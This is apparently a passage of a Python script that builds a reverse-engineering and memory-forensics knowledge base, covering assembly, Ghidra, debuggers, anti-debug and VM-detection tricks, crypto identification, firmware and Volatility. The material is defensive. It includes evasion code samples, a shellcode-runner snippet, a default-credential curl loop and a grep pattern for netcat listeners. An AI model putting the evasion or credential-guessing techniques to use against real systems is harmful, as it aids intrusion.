        "title": "x86/x64 Assembly for Reverse Engineers — Essential Instructions",
        "tags": ["assembly", "x86", "x64", "reverse-engineering", "malware-analysis"],
        "content": """# x86/x64 Assembly for Reverse Engineers

## Register Reference

### x86 General Purpose Registers

| Register | Primary Use |
|---|---|
| EAX | Return values, arithmetic |
| EBX | Base pointer (callee-saved) |
| ECX | Loop counter, arg 1 (fastcall) |
| EDX | Arithmetic overflow, arg 2 (fastcall) |
| ESI | Source pointer in string ops |
| EDI | Destination pointer |
| ESP | Stack pointer |
| EBP | Frame pointer |
| EIP | Instruction pointer |

### x64 Extensions

64-bit: `RAX–R15`. `EAX` = low 32 of `RAX`; `AX` = low 16; `AL`/`AH` = byte halves. Additional `R8–R15`.

### EFLAGS Key Bits

| Flag | Set When |
|---|---|
| ZF | Result is zero |
| CF | Unsigned overflow/borrow |
| SF | Result is negative |
| OF | Signed overflow |

## Calling Conventions

```asm
; x86 cdecl (args pushed right-to-left, caller cleans):
push arg3
push arg2
push arg1
call function
add esp, 12       ; clean 3 * 4 bytes
; return value in EAX

; x64 Windows (first 4 args: RCX RDX R8 R9, shadow space required):
sub rsp, 32       ; 32-byte shadow space
call function
add rsp, 32
; return in RAX

; x64 Linux (first 6 args: RDI RSI RDX RCX R8 R9):
; callee-saved: RBX RBP R12-R15
```

## Essential Instructions

```asm
; Data movement
mov eax, 0x10        ; immediate
mov eax, [esp+4]     ; dereference (memory read)
mov [ebp-8], eax     ; memory write
lea eax, [ebp-8]     ; load address (no memory access)
movsx eax, byte [ebp-1] ; sign-extend byte->dword
movzx eax, byte [ebp-1] ; zero-extend byte->dword

; Arithmetic
add eax, ebx    ; eax += ebx
sub eax, 1      ; eax -= 1
inc/dec eax     ; ±1
imul eax, ebx   ; signed multiply
mul ebx         ; unsigned EDX:EAX = EAX*EBX
neg eax         ; negate (two's complement)

; Logic
and eax, 0xFF   ; mask
or  eax, 0x01   ; set bits
xor eax, eax    ; zero (canonical idiom)
xor eax, key    ; XOR decrypt
shl eax, 2      ; multiply by 4
shr eax, 1      ; unsigned divide by 2
sar eax, 1      ; signed divide by 2
rol/ror eax, 8  ; rotate

; Comparison
cmp eax, 0      ; sets flags (ZF if equal)
test eax, eax   ; AND without store (tests zero)
je/jne/jz/jnz  ; conditional jumps
jl/jle/jg/jge  ; signed comparisons
jb/ja           ; unsigned below/above

; Stack
push eax         ; esp-=4; [esp]=eax
pop  eax         ; eax=[esp]; esp+=4
pushad/popad     ; push/pop all GP regs (x86)
call func        ; push eip; jmp func
ret              ; pop eip
leave            ; mov esp,ebp; pop ebp
```

## Function Frame Patterns

```asm
; x86 standard prologue/epilogue:
push ebp
mov  ebp, esp
sub  esp, 0x20       ; local vars at [ebp-4], [ebp-8], ...
                     ; args at [ebp+8], [ebp+12], ...
leave
ret

; x64 Windows:
push rbp
mov  rbp, rsp
sub  rsp, 0x30       ; locals + shadow space + alignment
add  rsp, 0x30
pop  rbp
ret
```

## Malware Code Patterns

### XOR Decrypt Loop

```asm
mov ecx, 0x200       ; length
mov esi, cipher_buf  ; pointer
mov al,  0x5A        ; single-byte key
.loop:
    xor [esi], al
    inc esi
    loop .loop       ; dec ecx; jnz .loop
jmp cipher_buf       ; jump to decrypted code
```

### Anti-Debug Timing

```asm
rdtsc              ; EDX:EAX = CPU cycle count
mov [t1], eax
; ... few instructions ...
rdtsc
sub eax, [t1]
cmp eax, 500000    ; large gap = single-stepping in debugger
jg  debugger_detected
```

### Dynamic API Resolution

```asm
push 0xDEAD1234    ; hash of "VirtualAlloc"
call resolve_hash  ; walks PEB→LDR→kernel32 EAT
; EAX = VirtualAlloc address (no import entry in IAT)
call eax
```

## Quick Idiom Reference

| Pattern | Meaning |
|---|---|
| `xor eax, eax` | eax = 0 |
| `test eax, eax` + `jz` | if (eax == 0) |
| `push ebp; mov ebp, esp` | Function prologue |
| `leave; ret` | Function epilogue |
| `rep movsb` | memcpy(edi, esi, ecx) |
| `rep stosd` | memset(edi, eax, ecx*4) |
| `repne scasb` | strlen idiom |
| `pushad; ...; popad; jmp` | Packer OEP stub |
""",
    },
    {
        "title": "Ghidra Fundamentals — Navigation, Decompilation, Scripting",
        "tags": ["ghidra", "reverse-engineering", "decompilation", "malware-analysis"],
        "content": """# Ghidra Fundamentals

## Installation

```bash
# Requires JDK 17+. Download from https://ghidra-sre.org/
# Windows: ghidraRun.bat
# Linux:   ./ghidraRun

# Project: File > New Project > Non-Shared
# Import:  File > Import File
# Analyze: Auto Analysis dialog > keep defaults > Analyze
```

## Core Windows

| Window | Purpose |
|---|---|
| Listing | Disassembly |
| Decompiler | C pseudo-code (Ctrl+E) |
| Symbol Table | All imports, exports, labels |
| Functions | All functions with sizes |
| Data Type Manager | Struct/typedef library |
| Memory Map | Segment layout |

## Navigation

```
G              Go to address or symbol
Ctrl+G         Go to function by name
Alt+←/→        Back/Forward in history
X              Cross-references for symbol at cursor
Ctrl+Shift+F   References window
F              Edit function (rename, signature)
L              Rename variable/label
Ctrl+L         Retype variable
Ctrl+F         Search in listing
Ctrl+D         Bookmark
```

## Analysis Workflow

```
1. Load binary, run auto-analysis
2. Apply Windows types: Window > Data Type Manager > Open Archive >
   windows_vs12_32.gdt (or 64.gdt)
3. Find entry point → rename function (F)
4. Follow suspicious imports (Symbol Table > filter > X for refs)
5. In Decompiler: rename vars (L), retype (Ctrl+L), rename functions (F)
6. Repeat until logic is clear
```

### Decompiler Example

```c
// Raw:
undefined4 FUN_00401000(void) {
    int iVar1 = FUN_00405000(0x100);
    if (iVar1 != 0) FUN_00406000(iVar1, DAT_00408000);
}

// After analysis:
BOOL DownloadAndExecute(void) {
    LPVOID pBuf = VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuf) memcpy(pBuf, g_shellcode, 0x100);
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pBuf, NULL, 0, NULL);
}
```

## Crypto Detection

```
# AES S-box: Search > For Bytes > 63 7C 77 7B F2 6B 6F C5
# FindCrypt extension (auto-labels all crypto constants):
  Help > Install Extensions > findcrypt-ghidra
  Analysis > One Shot > Find Crypto Constants

# RC4 KSA: look for two consecutive 256-iteration loops
# First: trivial S[i]=i init
# Second: j=(j+S[i]+key[i%len])%256; swap(S[i],S[j])
```

## Scripting — Java

```java
// ListInjectionAPIs.java
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.*;
import ghidra.program.model.symbol.*;

public class ListInjectionAPIs extends GhidraScript {
    String[] APIS = {"VirtualAllocEx","WriteProcessMemory",
                     "CreateRemoteThread","NtCreateThreadEx","QueueUserAPC"};
    public void run() throws Exception {
        SymbolTable st = currentProgram.getSymbolTable();
        ReferenceManager rm = currentProgram.getReferenceManager();
        for (String api : APIS) {
            for (Symbol sym : (Iterable<Symbol>)st.getSymbols(api)::iterator) {
                for (Reference ref : rm.getReferencesTo(sym.getAddress())) {
                    Function f = getFunctionContaining(ref.getFromAddress());
                    println(api+" called from "+(f!=null?f.getName():"?")+" at "+ref.getFromAddress());
                }
            }
        }
    }
}
```

## Scripting — Python (Jython)

```python
# FindURLs.py — list all URL strings and their callers
from ghidra.program.model.data import StringDataType
for data in currentProgram.getListing().getDefinedData(True):
    if not isinstance(data.getDataType(), StringDataType): continue
    v = str(data.getValue())
    if not v.startswith("http"): continue
    addr = data.getAddress()
    for ref in getReferencesTo(addr):
        f = getFunctionContaining(ref.getFromAddress())
        print(f"{v} <- {ref.getFromAddress()} in {f.getName() if f else '?'}")
```

## Headless Analysis

```bash
$GHIDRA_HOME/support/analyzeHeadless /tmp/projects MyProj \\
  -import malware.exe \\
  -postScript ListInjectionAPIs.java \\
  -scriptPath /opt/scripts/ \\
  -log /tmp/analysis.log \\
  -deleteProject
```
""",
    },
    {
        "title": "Debugging with x64dbg and WinDbg — Breakpoints, Tracing, Memory",
        "tags": ["x64dbg", "windbg", "debugging", "reverse-engineering", "malware-analysis"],
        "content": """# Debugging with x64dbg and WinDbg

## x64dbg Setup

```
Download: https://x64dbg.com/
Plugins:
  ScyllaHide  — anti-anti-debug
  xAnalyzer   — auto-comment API parameters
  ret-sync    — sync with Ghidra/IDA

Options > Preferences > Events:
  [x] Break on entry point
  [x] Break on TLS callbacks

ScyllaHide > Options:
  Enable all NtQueryInformationProcess hooks
  Enable IsDebuggerPresent, Heap Flags, GetTickCount, RDTSC patches
```

## Breakpoint Types

| Type | How to Set | Best For |
|---|---|---|
| Software (INT3) | F2 or `bp addr` | General use |
| Hardware Execute | Right-click > Breakpoint > Hardware | Anti-debug bypass (invisible to memory scan) |
| Hardware Write | `bph addr, w, 4` | Detect when buffer is written |
| Conditional | Set BP > Edit > Condition | Filter by register value |

```
Hardware BP examples (max 4 simultaneous):
bph 0x401000                 ; execute
bph 0x405000, rw, 4          ; read/write 4 bytes
bph 0x405000, w,  1          ; write 1 byte

Conditional (break on CreateFile only for specific name):
Condition: [rdx] == 0x006D0061   ; "am" in UTF-16
```

## Execution Control

| Action | Shortcut |
|---|---|
| Run | F9 |
| Step Into | F7 |
| Step Over | F8 |
| Run Until Return | Ctrl+F9 |
| Run to Cursor | F4 |
| Restart | Ctrl+F2 |
| Pause | F12 |

## OEP Finding (Packed Samples)

```
1. Run until initial setup done
2. Memory Map (Alt+M) — find large RWX section (unpacked payload)
3. Right-click section > Set Memory Breakpoint on Execution
4. F9 — packer decompresses → jumps to OEP → debugger breaks
5. Confirm: entropy should now be normal in dump window
6. Plugins > Scylla > IAT Autosearch > Get Imports > Dump > Fix Dump
7. Analyze unpacked binary statically
```

## Tracing

```
Debug > Trace Into / Trace Over (records all executed instructions)
View > Trace — review instruction history

Command bar:
tic  eax==0x100, 100000   ; trace into until eax==0x100 or 100000 steps
tocnd zf==1, 50000         ; trace over until ZF set
```

## WinDbg — Kernel Debugging

```
# Target VM setup:
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4

# Connect:
windbg -k net:port=50000,key=1.2.3.4

# Symbols:
.symfix C:\\Symbols
.sympath+ srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols
.reload /f
```

### Key WinDbg Commands

```windbg
!process 0 0              ; all processes (brief)
!process 0 7 malware.exe  ; detailed for specific name
~*k                        ; all threads, all stacks
!analyze -v               ; crash analysis

db addr L?10              ; dump bytes
dd addr L?4               ; dump dwords
da addr                   ; ASCII string
du addr                   ; Unicode string

bp nt!NtCreateFile         ; kernel function breakpoint
ba e 1 addr                ; hardware execute BP
ba w 4 addr                ; hardware write BP

lm                        ; all modules
!drvobj \\Driver\\name    ; driver object details
```

### Rootkit Detection (WinDbg)

```windbg
; DKOM hidden processes:
!process 0 0          ; via EPROCESS list (manipulable)
!poolfind Proc 2      ; pool scan for EPROCESS (bypasses DKOM)
; Objects in pool scan but not in !process = hidden

; SSDT hooks:
dq nt!KiServiceTable L?100
; Entries outside ntoskrnl range = hooked
lm m ntoskrnl         ; get range to compare against
```
""",
    },
    {
        "title": "Anti-Reversing Techniques — Anti-Debug, VM Detection, Obfuscation",
        "tags": ["anti-debug", "anti-reversing", "vm-detection", "obfuscation", "malware-analysis"],
        "content": """# Anti-Reversing Techniques

## Anti-Debug Techniques

### IsDebuggerPresent / PEB Check

```c
// Reads PEB.BeingDebugged byte (PEB + 0x02)
if (IsDebuggerPresent()) ExitProcess(0);

// Bypass: ScyllaHide patches automatically
// Manual: Memory Map > find PEB (gs:[0x60]) > set byte at offset 0x02 to 0
```

### NtQueryInformationProcess

```c
// ProcessDebugPort (class 7) = 0xFFFFFFFF when debugger attached
DWORD port = 0;
NtQueryInformationProcess(GetCurrentProcess(), 7, &port, 4, NULL);
if (port != 0) ExitProcess(0);

// Bypass: ScyllaHide hooks NtQueryInformationProcess in ntdll
```

### Timing Checks

```c
DWORD t1 = GetTickCount();
// ... code ...
if (GetTickCount() - t1 > 100) ExitProcess(0);  // Too slow = debugger

// RDTSC (more precise):
if (__rdtsc() - t1 > 500000) ExitProcess(0);

// Bypass: NOP out the CMP+JG, or ScyllaHide patches timing functions
```

### INT3 SEH Check

```c
__try {
    __asm int 3
    ExitProcess(0);          // Reached if debugger intercepts INT3
} __except(EXCEPTION_EXECUTE_HANDLER) {
    continue_normally();     // Reached without debugger
}
// Bypass: Options > Exceptions > add 0x80000003 to "pass to program"
```

### Heap Flags

```c
// PEB.NtGlobalFlag = 0x70 under debugger (heap validation enabled)
DWORD flags = *(DWORD*)((char*)PEB + 0x68);  // x86 offset
if (flags & 0x70) ExitProcess(0);

// Bypass: patch PEB.NtGlobalFlag to 0x00 in memory dump view
```

## VM Detection

### Registry Artifacts

```c
static const char* vmKeys[] = {
    "SOFTWARE\\VMware, Inc.\\VMware Tools",
    "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
};
// Bypass: delete these keys from the analysis VM
```

### CPUID Hypervisor Bit

```asm
mov eax, 1
cpuid
bt  ecx, 31          ; bit 31 = hypervisor present flag
jc  vm_detected

; EAX=0x40000000: hypervisor vendor string
; VMware = "VMwareVMware", VirtualBox = "VBoxVBoxVBox"
; Bypass: patch CPUID result, or use bare-metal analysis
```

### User Activity Heuristics

```c
ULONGLONG ticks = GetTickCount64();
if (ticks < 300000) ExitProcess(0);   // < 5 min uptime = sandbox

// Also checks: desktop file count, browser history, screen resolution
// Bypass: FLARE-VM has pre-populated user artifacts
//         Patch GetTickCount64 return value
```

## Code Obfuscation

### Control Flow Flattening

```c
// All logic hidden behind dispatcher switch:
int state = 0;
while (true) {
    switch (state) {
        case 0: state = condition ? 1 : 2; break;
        case 1: do_A(); state = 3; break;
        case 2: do_B(); state = 3; break;
        case 3: do_C(); return;
    }
}
// Bypass: dynamic trace execution path, ignore dispatcher boilerplate
```

### Opaque Predicates

```asm
mov eax, 6
imul eax, eax, eax  ; eax=36 (always even)
and eax, 1          ; always 0
jz  real_code       ; always taken — dead bytes below confuse disassembler
db 0xEB, 0x05       ; garbage bytes
real_code:
```

### Junk Code

```asm
push eax        ; junk
pop  eax        ; junk (net zero)
mov  eax, [ebp-4]  ; REAL
push ebx        ; junk
pop  ebx        ; junk
mov  [ebp-8], eax  ; REAL
; Decompiler absorbs junk automatically — focus on pseudo-code output
```

## Practical Bypass Workflow

```
1. ScyllaHide (covers ~80% of common techniques)
2. Remaining timing checks: NOP the CMP+JG comparison
3. CPUID checks: single-step to CPUID, manually clear ECX bit 31
4. Environment hardening:
   - Delete VM registry keys
   - Rename analysis tools
   - Set resolution 1920x1080
   - Use FLARE-VM for pre-built clean environment
   - Run malware > 5 minutes for uptime checks
```
""",
    },
    {
        "title": "Identifying Crypto in Binaries — AES, RC4, XOR, Custom Ciphers",
        "tags": ["cryptography", "aes", "rc4", "xor", "reverse-engineering", "malware-analysis"],
        "content": """# Identifying Crypto in Binaries

## XOR

### Detection

```python
# Most common byte XOR 0x20 (space) = likely single-byte key:
with open("blob.bin","rb") as f: data = f.read()
counts = {}
for b in data: counts[b] = counts.get(b,0)+1
mc = max(counts, key=counts.get)
print(f"Most common: 0x{mc:02X}, possible key: 0x{mc ^ 0x20:02X}")
```

```bash
pip install xortool
xortool -l 256 -c 20 blob.bin         # Guess key length
xortool -x 5A blob.bin -o plain.bin   # Decrypt with key 0x5A
```

### In Disassembly

```asm
mov ecx, length; mov esi, buf; mov al, key
.loop: xor [esi], al; inc esi; loop .loop
; Single-byte XOR loop — look for this near decryption code
```

## RC4

```python
# KSA pattern: two consecutive 256-iteration loops
# First: S[i] = i (trivial); Second: j=(j+S[i]+key[i%len])%256; swap

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i=(i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```

## AES

### S-Box Detection

```
First 8 bytes of AES S-box: 63 7C 77 7B F2 6B 6F C5
```

```bash
python3 -c "
sbox = bytes([0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5])
data = open('malware.exe','rb').read()
off = data.find(sbox)
print(f'AES S-box at 0x{off:X}' if off != -1 else 'Not found')
"

# Ghidra: Search > For Bytes > 63 7C 77 7B F2 6B 6F C5
# CAPA: capa malware.exe | grep -i aes
# FindCrypt plugin: auto-labels all AES constants
```

### Decryption

```python
from Crypto.Cipher import AES
key = bytes.fromhex("0011223344556677889aabbccddeeff0")
# CBC:
pt = AES.new(key, AES.MODE_CBC, bytes(16)).decrypt(ct)
# ECB:
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
# GCM: AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt(ct)
```

## ChaCha20 / Salsa20

```python
# Sigma constant: b"expand 32-byte k"
sigma = b"expand 32-byte k"
data = open("malware.exe","rb").read()
off = data.find(sigma)
if off != -1: print(f"ChaCha20/Salsa20 at 0x{off:X}")

from Crypto.Cipher import ChaCha20
pt = ChaCha20.new(key=key_32b, nonce=nonce_12b).decrypt(ct)
```

## Custom Cipher Analysis

```
1. Find cipher function: trace backward from send()/WriteFile()
2. Identify operations: XOR = stream; array lookup = S-box; block size 16 = AES-like
3. Extract key: check .rdata section or BP at cipher function entry, read key arg
4. Implement in Python, verify with known plaintext
5. Decrypt all captured traffic
```

## CyberChef Quick Reference

```
URL: https://gchq.github.io/CyberChef/

XOR:  From Hex > XOR (Key: AB, Scheme: Standard)
AES:  From Hex > AES Decrypt (Key: hex, IV: hex, Mode: CBC)
RC4:  From Hex > RC4 (Passphrase: hex key, Encoding: Hex)
PS:   From Base64 > Decode text (UTF-16LE)
```
""",
    },
    {
        "title": "Firmware Analysis — Extraction, Filesystem, QEMU Emulation",
        "tags": ["firmware", "iot", "embedded", "binwalk", "qemu", "reverse-engineering"],
        "content": """# Firmware Analysis

## Acquisition

```bash
# From vendor website: download update file
file firmware.bin
xxd firmware.bin | head -2   # Identify format by magic bytes

# UART serial console (most common hardware method):
screen /dev/ttyUSB0 115200   # Connect USB-to-TTL adapter
# Interrupt U-Boot autoboot to get root shell

# SPI flash chip reading:
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r dump.bin
```

## Binwalk

```bash
# Scan:
binwalk firmware.bin
# 0x0        TRX header
# 0x1C       LZMA compressed data
# 0x200000   Squashfs filesystem (little endian, 4.0)

# Entropy visualization (find encrypted regions):
binwalk -E firmware.bin

# Architecture scan:
binwalk -A firmware.bin   # "MIPS instructions", "ARM thumb", etc.

# Extract:
binwalk -e  firmware.bin        # Single pass
binwalk -eM firmware.bin        # Recursive

# Non-standard SquashFS:
sasquatch firmware.squashfs
jefferson filesystem.jffs2 -d output/
```

## Filesystem Security Analysis

```bash
cd squashfs-root/

# Hardcoded credentials:
grep -rn "password\\|passwd" etc/ --include="*.conf" --include="*.xml" 2>/dev/null
cat etc/passwd; cat etc/shadow

# Private keys:
find . -name "*.pem" -o -name "*.key" 2>/dev/null
grep -rl "BEGIN RSA PRIVATE KEY" . 2>/dev/null

# Startup scripts:
cat etc/inittab; cat etc/rc.local; ls etc/init.d/
grep -r "telnet\\|nc -l\\|backdoor" etc/ 2>/dev/null

# Vulnerable C functions:
find . -executable -type f | xargs strings 2>/dev/null | \\
  grep -E "\\bstrcpy\\b|\\bsprintf\\b|\\bgets\\b" | head -20

# Checksec all binaries:
find . -executable -type f | xargs checksec 2>/dev/null

# Automated scan:
git clone https://github.com/craigz28/firmwalker
./firmwalker/firmwalker.sh squashfs-root/ results.txt
```

## QEMU Emulation

### User-Mode (Easiest)

```bash
apt install qemu-user qemu-user-static
file squashfs-root/bin/busybox  # Determine arch: MIPS/ARM/x86

cp $(which qemu-mipsel-static) squashfs-root/usr/bin/
sudo chroot squashfs-root/ /bin/sh

# Now run firmware binaries:
/usr/sbin/httpd -p 8080 &
```

### FAT — Firmware Analysis Toolkit

```bash
git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
sudo ./setup.sh
sudo ./fat.py /path/to/firmware.bin
# Auto-detects arch, sets up QEMU, prints IP for connection
curl http://<qemu_ip>/
nmap -sV <qemu_ip>
```

## Vulnerability Discovery

```bash
# CGI command injection:
grep -rn "system\\|popen\\|exec(" squashfs-root/www/cgi-bin/ 2>/dev/null

# Default credential testing:
for cred in admin:admin admin:password root:root; do
  u=${cred%%:*}; p=${cred##*:}
  echo -n "$cred -> "
  curl -s -o /dev/null -w "%{http_code}" -u "$u:$p" http://<ip>/
  echo
done
```
""",
    },
    {
        "title": "Reverse Engineering Network Protocols from Binary Traffic",
        "tags": ["network-protocols", "reverse-engineering", "wireshark", "scapy", "malware-analysis"],
        "content": """# Reverse Engineering Network Protocols

## Traffic Capture

```bash
sudo tcpdump -i tap0 -w session.pcap -s 0
# Run malware in isolated VM; all traffic routed through host TAP
```

## Protocol Fingerprinting

```python
from scapy.all import rdpcap, TCP, IP, Raw
packets = rdpcap("session.pcap")
streams = {}
for pkt in packets:
    if IP in pkt and TCP in pkt and Raw in pkt:
        conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        streams.setdefault(conn, []).append(bytes(pkt[Raw]))
for conn, payloads in streams.items():
    print(f"{conn[0]}:{conn[1]} -> {conn[2]}:{conn[3]}")
    for i, p in enumerate(payloads[:3]):
        print(f"  [{i}] {p[:32].hex()}")
# Consistent first 4 bytes = magic; bytes 4-5 = command; 6-7 = length
```

## Correlating Traffic with Disassembly

```
x64dbg:
1. BP on ws2_32.send
2. At break: second arg (buf) at [esp+8] or RDX
3. Follow buf in dump = data BEFORE encryption
4. Ctrl+F9 (run to return), check same buf = encrypted
5. Call stack shows encryption wrapper function

Ghidra:
1. Symbol Table > filter "send" > XREFs
2. Trace backward from buf arg to message builder function
```

## Message Structure Recovery

```python
import struct

MAGIC    = 0xDEADBEEF
CMD_EXEC = 0x0001
CMD_RESP = 0x0002

def build(msg_type, payload):
    return struct.pack(">IHH", MAGIC, msg_type, len(payload)) + payload

def parse(data):
    magic, msg_type, length = struct.unpack_from(">IHH", data)
    assert magic == MAGIC
    return msg_type, data[8:8+length]
```

## Known-Plaintext Key Recovery

```python
# If plaintext starts with magic DE AD BE EF:
ct = bytes.fromhex("9bc3f1a2...")
kp = bytes([0xDE, 0xAD, 0xBE, 0xEF])
key_start = bytes([ct[i] ^ kp[i] for i in range(len(kp))])
print(f"Key: {key_start.hex()}")
# Extend by decrypting additional known sections
```

## Wireshark Lua Dissector

```lua
-- ~/.config/wireshark/plugins/custom_c2.lua
local proto = Proto("CustomC2","Custom C2")
local f_magic = ProtoField.uint32("cc2.magic","Magic",base.HEX)
local f_cmd   = ProtoField.uint16("cc2.cmd","Cmd",base.HEX)
local f_len   = ProtoField.uint16("cc2.len","Len",base.DEC)
local f_data  = ProtoField.bytes ("cc2.data","Data")
proto.fields  = {f_magic,f_cmd,f_len,f_data}

local CMDS = {[1]="Execute",[2]="Response",[3]="Heartbeat"}

function proto.dissector(buf,pinfo,tree)
    if buf:len() < 8 then return end
    if buf(0,4):uint() ~= 0xDEADBEEF then return end
    pinfo.cols.protocol = "CustomC2"
    local t = tree:add(proto,buf(),"Custom C2")
    t:add(f_magic,buf(0,4)); t:add(f_cmd,buf(4,2)); t:add(f_len,buf(6,2))
    local n = buf(6,2):uint()
    if n > 0 and buf:len() >= 8+n then t:add(f_data,buf(8,n)) end
    local cmd = buf(4,2):uint()
    pinfo.cols.info = "CustomC2 "..(CMDS[cmd] or string.format("0x%04x",cmd))
end
DissectorTable.get("tcp.port"):add(4444,proto)
```

## Detection Rules

```suricata
alert tcp any any -> any 4444 (
    msg:"Custom C2 Magic Bytes";
    content:"|DE AD BE EF|"; depth:4;
    flow:established,to_server;
    classtype:trojan-activity;
    sid:9000001; rev:1;
)
```

```zeek
# Zeek script:
event tcp_contents(c: connection, is_orig: bool, seq: count, contents: string) {
    if ( |contents| >= 4 && contents[0:4] == "\\xde\\xad\\xbe\\xef" )
        NOTICE([$note=Notice::Weird,$conn=c,
                $msg=fmt("Custom C2 from %s to %s:%d",
                         c$id$orig_h,c$id$resp_h,c$id$resp_p)]);
}
```
""",
    },
]
''')
print("Collection 2 written.")

# ============================================================
# COLLECTION 3 — MEMORY_FORENSICS (already in file as MEMORY_FORENSICS)
# ============================================================
# The current file still has the MEMORY_FORENSICS content from the last good _append_c3 run
# BUT the file was overwritten. Rebuild it here.

append('''

MEMORY_FORENSICS = [
    {
        "title": "Volatility 3 Framework — Installation, Plugins, Profiles",
        "tags": ["volatility", "memory-forensics", "dfir", "incident-response"],
        "content": """# Volatility 3 Framework

## Installation

```bash
pip install volatility3
# Or from source:
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3 && pip install -r requirements.txt

# Additional plugins:
pip install pycryptodome yara-python capstone
```

## Symbol Tables

Volatility 3 auto-downloads Windows symbols on first use (cached in `~/.cache/volatility3/symbols/`). For air-gapped environments, download pre-built symbol packs from https://downloads.volatilityfoundation.org/volatility3/symbols/ and extract to `volatility3/symbols/`.

## Basic Command Pattern

```bash
vol.py -f memory.raw <os>.<plugin> [args]

# Image information:
vol.py -f memory.raw windows.info

# Process listing:
vol.py -f memory.raw windows.pslist
vol.py -f memory.raw windows.pstree
vol.py -f memory.raw windows.psscan       # Pool-tag scan (bypasses DKOM)
vol.py -f memory.raw windows.cmdline      # Full command lines

# Network:
vol.py -f memory.raw windows.netscan

# Injection detection:
vol.py -f memory.raw windows.malfind
vol.py -f memory.raw windows.malfind --pid 1234

# Registry:
vol.py -f memory.raw windows.registry.hivelist
vol.py -f memory.raw windows.registry.printkey \\
    --key "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"

# Kernel:
vol.py -f memory.raw windows.ssdt
vol.py -f memory.raw windows.driverscan
vol.py -f memory.raw windows.modules

# Linux:
vol.py -f memory.raw linux.pslist
vol.py -f memory.raw linux.bash    # Bash history from memory
vol.py -f memory.raw linux.netstat
```

## Output Formats

```bash
vol.py -f memory.raw windows.pslist                 # Table (default)
vol.py -f memory.raw windows.pslist --output json   # JSON for scripting
vol.py -f memory.raw windows.netscan | grep ESTABLISHED
vol.py -f memory.raw windows.cmdline | grep -i "encoded\\|bypass\\|hidden"
```

## Triage Script

```bash
for plugin in pslist psscan pstree cmdline netscan malfind; do
    echo "=== $plugin ===" >> triage.txt
    vol.py -f memory.raw windows.$plugin >> triage.txt 2>&1
done
```
""",
    },
    {
        "title": "Process Analysis — pslist, pstree, Process Hollowing Detection",
        "tags": ["volatility", "process-analysis", "process-hollowing", "memory-forensics", "dfir"],
        "content": """# Process Analysis in Memory

## Process Listing Commands

```bash
vol.py -f memory.raw windows.pslist    # ActiveProcessLinks traversal
vol.py -f memory.raw windows.psscan   # Pool-tag scan (bypasses DKOM)
vol.py -f memory.raw windows.pstree   # Hierarchical view

# Find hidden processes (psscan - pslist):
comm -23 \\
  <(vol.py -f mem.raw windows.psscan | awk '{print $1}' | sort) \\
  <(vol.py -f mem.raw windows.pslist | awk '{print $1}' | sort)
```

## Suspicious Process Indicators

### Unusual Parent-Child Relationships

```
LEGITIMATE:
  wininit.exe → services.exe, lsass.exe
  services.exe → svchost.exe (multiple)
  explorer.exe → user applications

SUSPICIOUS:
  svchost.exe   parent = explorer.exe or cmd.exe
  lsass.exe     parent = anything other than wininit.exe
  powershell.exe parent = WINWORD.EXE or EXCEL.EXE
  cmd.exe        parent = svchost.exe (no obvious service)
  mshta.exe/wscript.exe parent = Office applications
```

```bash
vol.py -f memory.raw windows.pstree
# Inspect parent-child chains for anomalous branches
```

### Masquerading

```bash
vol.py -f memory.raw windows.cmdline | grep -i "svchost\\|lsass\\|csrss"
# Legitimate: C:\\Windows\\System32\\svchost.exe
# Suspicious:  C:\\Users\\user\\AppData\\Temp\\svchost.exe
```

## Process Hollowing Detection

### What It Is

Legitimate process started suspended → original code unmapped → malicious code written → resumed.

### Detection Steps

```bash
# 1. malfind — find RWX private allocations with MZ header:
vol.py -f memory.raw windows.malfind --pid <pid>
# VadS + PAGE_EXECUTE_READWRITE + MZ header = injected PE

# 2. VAD analysis — hollowed process has private executable regions:
vol.py -f memory.raw windows.vadinfo --pid <pid>
# Look for VadS (private, no mapped file) that are executable

# 3. Dump and compare:
vol.py -f memory.raw windows.procdump --pid <pid>
sha256sum procdump.*.exe
# Compare to known-good hash of svchost.exe from clean system
```

### VAD Tags

| Tag | Meaning |
|---|---|
| VadS | Private allocation (no file backing) |
| VadF | File-backed mapping |
| Vad | Standard VAD node |

VadS + executable + large size = injection indicator.

## DLL Injection Detection

```bash
vol.py -f memory.raw windows.handles --pid <injecting_pid> | grep Process
# Shows open handles to other processes (step 1 of injection)

vol.py -f memory.raw windows.dlllist --pid <target_pid>
# Look for DLLs in unusual paths (%TEMP%, %APPDATA%, C:\\ProgramData)
```

## Process Dump and Analysis

```bash
vol.py -f memory.raw windows.procdump --pid 1234       # Dump .exe
vol.py -f memory.raw windows.memmap --pid 1234 --dump  # Full address space
vol.py -f memory.raw windows.dlllist --pid 1234 --dump # All loaded DLLs

# Analyze dump:
die procdump.1234.exe
strings procdump.1234.exe | grep -E "http|cmd|powershell"
yara -r rules/ procdump.1234.exe
```
""",
    },
    {
        "title": "Detecting Code Injection — malfind, VAD Analysis, Hollowed Processes",
        "tags": ["code-injection", "malfind", "vad", "memory-forensics", "volatility"],
        "content": """# Detecting Code Injection

## Injection Technique Reference

| Technique | Key APIs | Detection |
|---|---|---|
| Classic DLL injection | CreateRemoteThread + LoadLibrary | Unexpected DLL in dlllist |
| Shellcode injection | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | RWX VadS region |
